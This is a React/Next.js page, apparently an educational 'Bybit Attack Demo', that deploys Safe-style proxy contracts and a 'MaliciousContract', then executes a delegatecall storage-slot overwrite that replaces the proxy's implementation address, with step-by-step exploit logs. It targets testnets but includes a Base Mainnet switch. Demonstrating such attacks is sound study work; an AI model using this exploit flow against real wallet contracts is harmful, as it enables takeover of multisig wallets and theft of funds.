'use client'

import { useState, useEffect } from 'react'

declare global {
  interface Window {
    ethereum?: any
  }
}

interface ContractAddresses {
  safeProxy?: string
  safeImplementation?: string
  maliciousContract?: string
}

export default function Home() {
  const [account, setAccount] = useState<string | null>(null)
  const [addresses, setAddresses] = useState<ContractAddresses>({})
  const [status, setStatus] = useState<string>('')
  const [isDeploying, setIsDeploying] = useState(false)
  const [manualInput, setManualInput] = useState<ContractAddresses>({})
  const [showManualInput, setShowManualInput] = useState(false)
  const [beforeExploit, setBeforeExploit] = useState<string>('')
  const [afterExploit, setAfterExploit] = useState<string>('')
  const [hasMetaMask, setHasMetaMask] = useState(false)
  const [exploitLogs, setExploitLogs] = useState<string[]>([])
  const [networkName, setNetworkName] = useState<string>('unknown')

  useEffect(() => {
    // Check if we're in the browser
    if (typeof window !== 'undefined' && window.ethereum) {
      setHasMetaMask(true)
      checkWallet()
      
      // Listen for account changes
      window.ethereum.on('accountsChanged', handleAccountsChanged)
      
      return () => {
        window.ethereum.removeListener('accountsChanged', handleAccountsChanged)
      }
    } else {
      setHasMetaMask(false)
      setStatus('MetaMask not detected. Please install MetaMask extension.')
    }
  }, [])

  const handleAccountsChanged = (accounts: string[]) => {
    if (accounts.length > 0) {
      setAccount(accounts[0])
    } else {
      setAccount(null)
    }
  }

  const checkWallet = async () => {
    if (typeof window !== 'undefined' && window.ethereum) {
      try {
        const accounts = await window.ethereum.request({ method: 'eth_accounts' })
        if (accounts.length > 0) {
          setAccount(accounts[0])
        }
      } catch (error) {
        console.error('Error checking wallet:', error)
      }
    }
  }

  const connectWallet = async () => {
    if (!window.ethereum) {
      setStatus('Please install MetaMask from https://metamask.io/')
      window.open('https://metamask.io/download/', '_blank')
      return
    }

    try {
      setStatus('Requesting account access...')
      const accounts = await window.ethereum.request({ 
        method: 'eth_requestAccounts' 
      })
      if (accounts && accounts.length > 0) {
        setAccount(accounts[0])
        setStatus('✓ Wallet connected!')
      }
    } catch (error: any) {
      console.error('Wallet connection error:', error)
      if (error.code === 4001) {
        setStatus('❌ Connection rejected by user')
      } else {
        setStatus(`❌ Error: ${error.message}`)
      }
    }
  }

  const switchToSepolia = async () => {
    if (!window.ethereum) return
    
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0xaa36a7' }], // Sepolia
      })
      setStatus('✓ Switched to Sepolia network')
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0xaa36a7',
              chainName: 'Sepolia',
              nativeCurrency: { name: 'SepoliaETH', symbol: 'ETH', decimals: 18 },
              rpcUrls: ['https://sepolia.infura.io/v3/'],
              blockExplorerUrls: ['https://sepolia.etherscan.io'],
            }],
          })
          setStatus('✓ Added and switched to Sepolia')
        } catch (addError) {
          setStatus('❌ Error adding Sepolia network')
        }
      } else {
        setStatus(`❌ Error: ${switchError.message}`)
      }
    }
  }

  const switchToBase = async () => {
    if (!window.ethereum) return
    
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x2105' }], // Base Mainnet
      })
      setStatus('✓ Switched to Base Mainnet')
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x2105',
              chainName: 'Base',
              nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
              rpcUrls: ['https://mainnet.base.org'],
              blockExplorerUrls: ['https://basescan.org'],
            }],
          })
          setStatus('✓ Added and switched to Base')
        } catch (addError) {
          setStatus('❌ Error adding Base network')
        }
      } else {
        setStatus(`❌ Error: ${switchError.message}`)
      }
    }
  }

  const switchToBaseSepolia = async () => {
    if (!window.ethereum) return
    
    try {
      await window.ethereum.request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x14a33' }], // Base Sepolia
      })
      setStatus('✓ Switched to Base Sepolia')
    } catch (switchError: any) {
      if (switchError.code === 4902) {
        try {
          await window.ethereum.request({
            method: 'wallet_addEthereumChain',
            params: [{
              chainId: '0x14a33',
              chainName: 'Base Sepolia',
              nativeCurrency: { name: 'ETH', symbol: 'ETH', decimals: 18 },
              rpcUrls: ['https://sepolia.base.org'],
              blockExplorerUrls: ['https://sepolia.basescan.org'],
            }],
          })
          setStatus('✓ Added and switched to Base Sepolia')
        } catch (addError) {
          setStatus('❌ Error adding Base Sepolia network')
        }
      } else {
        setStatus(`❌ Error: ${switchError.message}`)
      }
    }
  }

  const deploySafeImplementation = async () => {
    if (!account || !window.ethereum) {
      setStatus('Please connect your wallet first')
      return
    }
    
    setIsDeploying(true)
    setStatus('Deploying Safe Implementation...')
    
    try {
      const { ethers } = await import('ethers')
      const provider = new ethers.BrowserProvider(window.ethereum)
      const signer = await provider.getSigner()
      
      // Load artifact dynamically
      const artifact = await fetch('/api/artifacts/SafeImplementation')
      if (!artifact.ok) {
        throw new Error('Contracts not compiled. Run: npm run compile')
      }
      
      const { abi, bytecode } = await artifact.json()
      
      const factory = new ethers.ContractFactory(abi, bytecode, signer)
      const contract = await factory.deploy()
      await contract.waitForDeployment()
      
      const address = await contract.getAddress()
      setAddresses(prev => ({ ...prev, safeImplementation: address }))
      setStatus(`✓ Safe Implementation deployed: ${address}`)
    } catch (error: any) {
      console.error('Deployment error:', error)
      setStatus(`Error: ${error.message}`)
    } finally {
      setIsDeploying(false)
    }
  }

  const deployMaliciousContract = async () => {
    if (!account || !window.ethereum) {
      setStatus('Please connect your wallet first')
      return
    }
    
    setIsDeploying(true)
    setStatus('Deploying Malicious Contract...')
    
    try {
      const { ethers } = await import('ethers')
      const provider = new ethers.BrowserProvider(window.ethereum)
      const signer = await provider.getSigner()
      
      const artifact = await fetch('/api/artifacts/MaliciousContract')
      if (!artifact.ok) {
        throw new Error('Contracts not compiled. Run: npm run compile')
      }
      
      const { abi, bytecode } = await artifact.json()
      
      const factory = new ethers.ContractFactory(abi, bytecode, signer)
      const contract = await factory.deploy()
      await contract.waitForDeployment()
      
      const address = await contract.getAddress()
      setAddresses(prev => ({ ...prev, maliciousContract: address }))
      setStatus(`✓ Malicious Contract deployed: ${address}`)
    } catch (error: any) {
      console.error('Deployment error:', error)
      setStatus(`Error: ${error.message}`)
    } finally {
      setIsDeploying(false)
    }
  }

  const deploySafeProxy = async () => {
    if (!account || !window.ethereum || !addresses.safeImplementation) {
      setStatus('Please deploy Safe Implementation first')
      return
    }
    
    setIsDeploying(true)
    setStatus('Deploying Safe Proxy...')
    
    try {
      const { ethers } = await import('ethers')
      const provider = new ethers.BrowserProvider(window.ethereum)
      const signer = await provider.getSigner()
      
      const artifact = await fetch('/api/artifacts/SafeProxy')
      if (!artifact.ok) {
        throw new Error('Contracts not compiled. Run: npm run compile')
      }
      
      const { abi, bytecode } = await artifact.json()
      
      const factory = new ethers.ContractFactory(abi, bytecode, signer)
      // Deploy with SafeImplementation as initial implementation
      const contract = await factory.deploy(addresses.safeImplementation)
      await contract.waitForDeployment()
      
      const address = await contract.getAddress()
      setAddresses(prev => ({ ...prev, safeProxy: address }))
      setStatus(`✓ Safe Proxy deployed: ${address}`)
    } catch (error: any) {
      console.error('Deployment error:', error)
      setStatus(`Error: ${error.message}`)
    } finally {
      setIsDeploying(false)
    }
  }

  const loadManualAddresses = () => {
    setAddresses(prev => ({
      ...prev,
      ...manualInput
    }))
    setShowManualInput(false)
    setStatus('✓ Manual addresses loaded!')
  }

  const addLog = (message: string) => {
    console.log(message)
    setExploitLogs(prev => [...prev, `${new Date().toLocaleTimeString()}: ${message}`])
    setStatus(message)
  }

  const getExplorerUrl = (address: string) => {
    const network = networkName.toLowerCase()
    if (network.includes('base sepolia')) return `https://sepolia.basescan.org/address/${address}`
    if (network.includes('base')) return `https://basescan.org/address/${address}`
    if (network.includes('sepolia')) return `https://sepolia.etherscan.io/address/${address}`
    return `https://etherscan.io/address/${address}`
  }

  const demonstrateExploit = async () => {
    if (!addresses.safeProxy || !addresses.maliciousContract) {
      setStatus('Please load contract addresses first')
      return
    }

    if (!account || !window.ethereum) {
      setStatus('Please connect your wallet')
      return
    }

    // Clear previous logs
    setExploitLogs([])

    try {
      addLog('🔍 Step 1: Starting exploit...')
      
      // Import ethers dynamically to avoid SSR issues
      const { ethers } = await import('ethers')
      addLog('📦 ethers.js loaded')
      
      if (!window.ethereum) {
        setStatus('MetaMask not available')
        return
      }

      const provider = new ethers.BrowserProvider(window.ethereum)
      const signer = await provider.getSigner()
      addLog('✅ Connected to wallet')
      
      // Import ABIs
      const { SafeProxyABI, MaliciousContractABI } = await import('../contracts/ABI')
      addLog('📄 ABIs loaded')
      
      // Step 1: Check implementation BEFORE
      addLog(`📊 Reading original proxy implementation...`)
      const safeProxy = new ethers.Contract(addresses.safeProxy, SafeProxyABI, signer)
      const implBefore = await safeProxy.getImplementation()
      
      addLog(`📍 Original Safe Proxy implementation: ${implBefore}`)
      setBeforeExploit(implBefore)
      
      // Step 2: Deploy proxy with MaliciousContract as implementation
      addLog('🎯 Step 2: Deploying proxy with MaliciousContract as implementation')
      
      const proxyArtifact = await fetch('/api/artifacts/SafeProxy')
      const { abi: proxyAbi, bytecode: proxyBytecode } = await proxyArtifact.json()
      const ProxyFactory = new ethers.ContractFactory(proxyAbi, proxyBytecode, signer)
      
      addLog(`📦 Deploying SafeProxy with MaliciousContract as impl...`)
      const attackedProxy = await ProxyFactory.deploy(addresses.maliciousContract)
      await attackedProxy.waitForDeployment()
      const attackedProxyAddress = await attackedProxy.getAddress()
      
      addLog(`✅ Proxy deployed: ${attackedProxyAddress}`)
      addLog(`📊 Proxy now points to: ${addresses.maliciousContract}`)
      
      // Step 3: Call transfer() which will trigger the exploit
      addLog('🎯 Step 3: Calling transfer() on proxy (this triggers delegatecall to MaliciousContract)')
      addLog(`📍 Calling: transfer(${account}, 0)`)
      
      const iface = new ethers.Interface(MaliciousContractABI)
      const data = iface.encodeFunctionData("transfer", [account, 0])
      
      addLog(`📤 Sending transaction...`)
      const tx = await signer.sendTransaction({
        to: attackedProxyAddress,
        data: data,
        gasLimit: 200000
      })
      
      addLog(`⏳ Transaction hash: ${tx.hash}`)
      addLog(`⏳ Waiting for confirmation...`)
      await tx.wait()
      
      addLog('✅ Transaction confirmed!')
      addLog(`📊 Transfer() wrote ${account} to slot 0 of the proxy`)
      
      // Step 4: Verify the exploit worked
      addLog('🔍 Step 4: Verifying exploit - checking implementation address...')
      
      const attackedProxyContract = new ethers.Contract(attackedProxyAddress, SafeProxyABI, signer)
      const implAfter = await attackedProxyContract.getImplementation()
      setAfterExploit(implAfter)
      
      addLog(`📍 BEFORE transfer(): ${addresses.maliciousContract}`)
      addLog(`📍 AFTER transfer():  ${implAfter}`)
      
      if (addresses.maliciousContract.toLowerCase() !== implAfter.toLowerCase()) {
        addLog(`✅✅✅ EXPLOIT SUCCESSFUL!`)
        addLog(`📍 Implementation address changed from MaliciousContract to ${implAfter}`)
        addLog(`📝 This proves: Storage slot 0 (implementation) was overwritten!`)
        addLog(`📝 MaliciousContract's _transfer write affected the proxy's storage!`)
      } else {
        addLog(`⚠️ Implementation unchanged. The write to slot 0 didn't change the address.`)
      }
      
    } catch (error: any) {
      console.error('Exploit error:', error)
      setStatus(`❌ Error: ${error.message}\n\nTry: Connect wallet, ensure you're on Sepolia, and have enough ETH for gas.`)
    }
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-gray-900 to-black p-8">
      <div className="max-w-4xl mx-auto">
        <div className="mb-8 text-center">
          <h1 className="text-5xl font-bold mb-4 bg-gradient-to-r from-purple-400 to-pink-400 bg-clip-text text-transparent">
            Bybit Attack Demo
          </h1>
          <p className="text-gray-400 text-lg">
            Deploy and Exploit on Sepolia Testnet
          </p>
        </div>

        {/* Wallet Connection */}
        <div className="bg-gray-800 rounded-lg p-6 mb-6 border border-gray-700">
          <h2 className="text-2xl font-semibold mb-4 text-green-400">Wallet Connection</h2>
          {!account ? (
            <div className="space-y-4">
              <div className="flex items-center gap-4">
                <button
                  onClick={connectWallet}
                  disabled={!hasMetaMask}
                  className="bg-blue-600 hover:bg-blue-700 disabled:bg-gray-600 disabled:cursor-not-allowed px-6 py-3 rounded-lg font-semibold transition-colors"
                >
                  Connect Wallet
                </button>
                {!hasMetaMask && (
                  <a
                    href="https://metamask.io/download/"
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-blue-400 hover:text-blue-300 underline"
                  >
                    Install MetaMask →
                  </a>
                )}
              </div>
              
              <div className="bg-yellow-900/20 border border-yellow-700 rounded p-3 text-sm text-yellow-300">
                <p className="font-semibold mb-2">⚠️ Troubleshooting:</p>
                <ul className="list-disc list-inside space-y-1 text-xs">
                  <li>Make sure MetaMask is installed in your browser</li>
                  <li>MetaMask extension must be unlocked</li>
                  <li>Try hard refresh: Cmd+Shift+R (Mac) or Ctrl+Shift+R (Windows)</li>
                  <li>Check browser console (F12) for errors</li>
                </ul>
              </div>
            </div>
          ) : (
            <div className="space-y-4">
              <div className="bg-green-900/30 border border-green-700 rounded p-4">
                <p className="text-green-400 font-semibold">✓ Connected: {account}</p>
              </div>
              <div className="flex flex-wrap gap-2">
              <button
                onClick={async () => { await switchToSepolia(); setNetworkName('Sepolia'); }}
                className="bg-yellow-600 hover:bg-yellow-700 px-4 py-2 rounded text-sm font-semibold"
              >
                Switch to Sepolia
              </button>
              <button
                onClick={async () => { await switchToBase(); setNetworkName('Base'); }}
                className="bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded text-sm font-semibold"
              >
                Switch to Base
              </button>
              <button
                onClick={async () => { await switchToBaseSepolia(); setNetworkName('Base Sepolia'); }}
                className="bg-green-600 hover:bg-green-700 px-4 py-2 rounded text-sm font-semibold"
              >
                Switch to Base Sepolia
              </button>
              </div>
            </div>
          )}
        </div>

        {/* Manual Address Input */}
        <div className="bg-gray-800 rounded-lg p-6 mb-6 border border-blue-700">
          <div className="flex justify-between items-center mb-4">
            <h2 className="text-2xl font-semibold text-blue-400">Manual Address Entry</h2>
            <button
              onClick={() => setShowManualInput(!showManualInput)}
              className="text-blue-400 hover:text-blue-300"
            >
              {showManualInput ? '▼ Hide' : '▶ Show'}
            </button>
          </div>
          <p className="text-sm text-gray-400 mb-3">
            After running <code className="bg-black px-2 py-1 rounded">npm run deploy:sepolia</code>, paste the addresses here:
          </p>
          
          {showManualInput && (
            <div className="space-y-3 mt-4">
              <div>
                <label className="block text-sm font-semibold mb-2 text-gray-300">Safe Implementation</label>
                <input
                  type="text"
                  placeholder="0x..."
                  className="w-full bg-gray-700 rounded px-4 py-2 font-mono text-sm"
                  value={manualInput.safeImplementation || ''}
                  onChange={(e) => setManualInput({...manualInput, safeImplementation: e.target.value})}
                />
              </div>
              <div>
                <label className="block text-sm font-semibold mb-2 text-gray-300">Safe Proxy</label>
                <input
                  type="text"
                  placeholder="0x..."
                  className="w-full bg-gray-700 rounded px-4 py-2 font-mono text-sm"
                  value={manualInput.safeProxy || ''}
                  onChange={(e) => setManualInput({...manualInput, safeProxy: e.target.value})}
                />
              </div>
              <div>
                <label className="block text-sm font-semibold mb-2 text-gray-300">Malicious Contract</label>
                <input
                  type="text"
                  placeholder="0x..."
                  className="w-full bg-gray-700 rounded px-4 py-2 font-mono text-sm"
                  value={manualInput.maliciousContract || ''}
                  onChange={(e) => setManualInput({...manualInput, maliciousContract: e.target.value})}
                />
              </div>
              <button
                onClick={loadManualAddresses}
                className="w-full bg-blue-600 hover:bg-blue-700 px-4 py-2 rounded font-semibold"
              >
                Load Addresses
              </button>
            </div>
          )}
        </div>

        {/* Contract Deployment */}
        <div className="bg-gray-800 rounded-lg p-6 mb-6 border border-gray-700">
          <h2 className="text-2xl font-semibold mb-4 text-blue-400">Deploy Contracts</h2>
          
          <div className="space-y-4">
            <div className="bg-gray-700 rounded p-4 border border-gray-600">
              <h3 className="font-semibold mb-2 text-green-300">1. Safe Implementation</h3>
              <button
                onClick={deploySafeImplementation}
                disabled={!account || isDeploying}
                className="bg-green-600 hover:bg-green-700 disabled:opacity-50 disabled:cursor-not-allowed px-4 py-2 rounded transition-colors mb-3"
              >
                {isDeploying ? 'Deploying...' : 'Deploy Safe Implementation'}
              </button>
              {addresses.safeImplementation && (
                <div>
                  <p className="text-sm text-gray-300 break-all font-mono mb-2">
                    {addresses.safeImplementation}
                  </p>
                  <a 
                    href={getExplorerUrl(addresses.safeImplementation)}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-blue-400 hover:text-blue-300 text-sm"
                  >
                    View on Explorer ↗
                  </a>
                </div>
              )}
            </div>

            <div className="bg-gray-700 rounded p-4 border border-red-600">
              <h3 className="font-semibold mb-2 text-red-400">2. Malicious Contract</h3>
              <button
                onClick={deployMaliciousContract}
                disabled={!account || isDeploying}
                className="bg-red-600 hover:bg-red-700 disabled:opacity-50 disabled:cursor-not-allowed px-4 py-2 rounded transition-colors mb-3"
              >
                {isDeploying ? 'Deploying...' : 'Deploy Malicious Contract'}
              </button>
              {addresses.maliciousContract && (
                <div>
                  <p className="text-sm text-gray-300 break-all font-mono mb-2">
                    {addresses.maliciousContract}
                  </p>
                  <a 
                    href={getExplorerUrl(addresses.maliciousContract)}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-blue-400 hover:text-blue-300 text-sm"
                  >
                    View on Explorer ↗
                  </a>
                </div>
              )}
            </div>

            <div className="bg-gray-700 rounded p-4 border border-yellow-600">
              <h3 className="font-semibold mb-2 text-yellow-300">3. Safe Proxy</h3>
              {!addresses.safeImplementation && (
                <p className="text-xs text-gray-400 mb-2">⚠️ Deploy Safe Implementation first!</p>
              )}
              <button
                onClick={deploySafeProxy}
                disabled={!account || isDeploying || !addresses.safeImplementation}
                className="bg-yellow-600 hover:bg-yellow-700 disabled:opacity-50 disabled:cursor-not-allowed px-4 py-2 rounded transition-colors mb-3"
              >
                {isDeploying ? 'Deploying...' : 'Deploy Safe Proxy'}
              </button>
              {addresses.safeProxy && (
                <div>
                  <p className="text-sm text-gray-300 break-all font-mono mb-2">
                    {addresses.safeProxy}
                  </p>
                  <a 
                    href={getExplorerUrl(addresses.safeProxy)}
                    target="_blank"
                    rel="noopener noreferrer"
                    className="text-blue-400 hover:text-blue-300 text-sm"
                  >
                    View on Explorer ↗
                  </a>
                </div>
              )}
            </div>
          </div>
        </div>

        {/* Exploit Demonstration */}
        <div className="bg-gray-800 rounded-lg p-6 mb-6 border border-purple-600">
          <h2 className="text-2xl font-semibold mb-4 text-purple-400">Exploit Demonstration</h2>
          
          <div className="mb-4">
            <button
              onClick={demonstrateExploit}
              disabled={!addresses.safeProxy || !addresses.maliciousContract}
              className="bg-purple-600 hover:bg-purple-700 px-6 py-3 rounded-lg font-semibold disabled:opacity-50 disabled:cursor-not-allowed transition-colors"
            >
              Execute Exploit
            </button>
          </div>

          {exploitLogs.length > 0 && (
            <div className="mt-4 bg-black rounded p-4 border border-gray-700">
              <h3 className="text-lg font-semibold mb-3 text-green-400">📋 Execution Logs</h3>
              <div className="max-h-96 overflow-y-auto">
                {exploitLogs.map((log, index) => (
                  <div key={index} className="text-sm text-gray-300 mb-1 font-mono">
                    {log}
                  </div>
                ))}
              </div>
            </div>
          )}

          {beforeExploit && (
            <div className="mt-4 p-3 bg-yellow-900/20 border border-yellow-700 rounded">
              <p className="text-sm text-yellow-400">
                <strong>Before:</strong> {beforeExploit}
              </p>
            </div>
          )}
          
          {afterExploit && (
            <div className="mt-4 p-3 bg-red-900/20 border border-red-700 rounded">
              <p className="text-sm text-red-400">
                <strong>After:</strong> {afterExploit}
              </p>
            </div>
          )}
        </div>

        {/* Status */}
        {status && (
          <div className="bg-yellow-900/30 border border-yellow-700 rounded-lg p-4 mb-6">
            <p className="text-yellow-400">{status}</p>
          </div>
        )}

        {/* Instructions */}
        <div className="bg-gray-800 rounded-lg p-6 border border-gray-700">
          <h2 className="text-2xl font-semibold mb-4 text-cyan-400">How to Use</h2>
          <div className="space-y-3 text-gray-300">
            <div className="flex gap-3">
              <span className="text-cyan-500 font-bold">1.</span>
              <p>Deploy contracts using <code className="bg-black px-2 py-1 rounded">npm run deploy:sepolia</code></p>
            </div>
            <div className="flex gap-3">
              <span className="text-cyan-500 font-bold">2.</span>
              <p>Copy the addresses from terminal output</p>
            </div>
            <div className="flex gap-3">
              <span className="text-cyan-500 font-bold">3.</span>
              <p>Paste addresses into "Manual Address Entry" section above</p>
            </div>
            <div className="flex gap-3">
              <span className="text-cyan-500 font-bold">4.</span>
              <p>Click "Load Addresses" and then "Execute Exploit"</p>
            </div>
          </div>
        </div>
      </div>
    </div>
  )
}